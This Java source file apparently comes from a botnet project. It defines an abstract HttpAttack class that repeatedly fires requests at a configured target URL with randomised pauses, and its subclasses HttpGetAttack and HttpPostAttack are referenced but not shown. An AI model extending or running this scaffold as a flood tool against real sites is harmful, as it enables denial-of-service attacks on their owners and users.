/**
 * The MIT License (MIT)
 * <p>
 * Copyright (c) 2016 Giacomo Marciani and Michele Porretta
 * <p>
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 * <p>
 * <p>
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 * <p>
 * <p>
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 */

package com.acmutv.botnet.attack;

import com.acmutv.botnet.target.HttpTarget;
import com.acmutv.botnet.service.RandomGenerator;
import lombok.AllArgsConstructor;
import lombok.Getter;

import java.io.IOException;
import java.net.URL;
import java.util.Random;
import java.util.concurrent.TimeUnit;

/**
 * This class realizes the behaviour of a HTTP attack.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see HttpGetAttack
 * @see HttpPostAttack
 * @see HttpTarget
 */
@Getter
@AllArgsConstructor
public abstract class HttpAttack implements Runnable {
  private HttpTarget target;
  private Random rndgen;

  @Override
  public void run() {
    HttpTarget tgt = this.getTarget();
    for (long i = 0; i < tgt.getMaxAttempts(); i++) {
      try {
        this.makeAttack(tgt.getUrl());
      } catch (IOException e) {
        e.printStackTrace();
        return;
      }
      this.sleep();
    }
  }

  public abstract void makeAttack(final URL url) throws IOException;

  private void sleep() {
    int seconds = RandomGenerator.getRandomIntInPeriod(this.getTarget().getPeriod(), this.getRndgen());
    try {
      TimeUnit.SECONDS.sleep(seconds);
    } catch (InterruptedException e) {
      e.printStackTrace();
    }
  }
}
